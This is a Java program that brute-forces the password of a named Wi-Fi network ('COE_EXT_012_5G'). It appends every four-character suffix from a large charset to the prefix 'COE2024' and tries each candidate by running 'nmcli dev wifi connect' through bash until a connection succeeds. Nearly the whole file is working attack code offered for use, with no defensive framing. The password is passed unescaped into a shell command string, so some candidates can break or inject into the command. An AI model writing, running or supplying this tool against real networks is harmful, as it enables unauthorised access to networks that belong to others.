import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.time.LocalTime;
import java.util.ArrayList;
import java.util.List;

public class WifiPasswordBruteForce {

    private static final String SSID = "COE_EXT_012_5G"; // 🔁 Replace with your real SSID
    private static final String CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
    private static final String[] PREFIXES = {
            "COE2024"
            // Add more if needed
    };

    public static void main(String[] args) {
        for (String prefix : PREFIXES) {
            generateCombinations(prefix, 4); // 4-character suffixes
        }
    }

    public static void generateCombinations(String prefix, int suffixLength) {
        List<String> suffixes = new ArrayList<>();
        generateSuffixes("", suffixLength, suffixes);

        for (String suffix : suffixes) {
            String password = prefix + suffix;
            String currentTime = LocalTime.now().toString();
            System.out.println("Trying password: " + password);
            System.out.println("Time: " + currentTime);

            if (tryPassword(password)) {
                System.out.println("✅ Correct password found: " + password);
                System.exit(0);
            } else {
                System.out.println("❌ Incorrect");
            }
        }
    }

    // Recursive function to generate all suffix combinations
    private static void generateSuffixes(String current, int remaining, List<String> result) {
        if (remaining == 0) {
            result.add(current);
            return;
        }

        for (int i = 0; i < CHARSET.length(); i++) {
            generateSuffixes(current + CHARSET.charAt(i), remaining - 1, result);
        }
    }

    // Executes nmcli to try to connect to the network
    private static boolean tryPassword(String password) {
        String command = String.format("nmcli dev wifi connect '%s' password '%s'", SSID, password);
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.toLowerCase().contains("successfully")) {
                    return true;
                }
            }

            process.waitFor();
        } catch (Exception e) {
            // Handle exception or ignore failed attempt
        }

        return false;
    }
}
